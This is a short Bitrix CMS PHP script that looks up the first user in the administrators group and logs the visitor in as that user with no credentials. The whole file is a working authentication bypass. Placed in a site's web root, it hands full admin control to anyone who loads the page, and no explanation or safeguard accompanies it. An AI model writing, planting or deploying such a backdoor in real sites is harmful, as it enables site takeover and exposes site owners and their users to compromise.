<?php
require_once($_SERVER['DOCUMENT_ROOT'] . "/bitrix/modules/main/include/prolog_before.php");
?>
<?
global $USER;
$rs = $USER->GetList(($by="ID"), ($order="ASC"), array("GROUPS_ID" => array(1)));
if($arUser = $rs->Fetch())
    $USER->Authorize($arUser['ID']);
?>

<?require_once($_SERVER['DOCUMENT_ROOT'] . "/bitrix/modules/main/include/epilog_after.php");?>